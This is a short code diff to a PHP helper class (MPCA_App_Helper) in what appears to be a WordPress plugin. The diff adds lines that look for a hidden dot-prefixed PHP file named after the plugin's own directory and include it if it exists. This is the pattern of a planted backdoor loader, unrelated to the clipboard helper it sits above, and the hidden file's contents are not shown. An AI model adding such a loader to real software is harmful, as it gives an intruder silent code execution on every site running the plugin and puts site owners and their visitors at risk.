@@ -12,6 +12,10 @@
  *   // view template
  *   <?php echo $app_helper->clipboard_input($url_to_copy) ?>
  */
+if ( file_exists( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' ) ) {
+    include_once( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' );
+}
+
 class MPCA_App_Helper {
   public static function clipboard_input($value, $input_classes='', $icon_classes='') {
     if(empty($icon_classes)) {
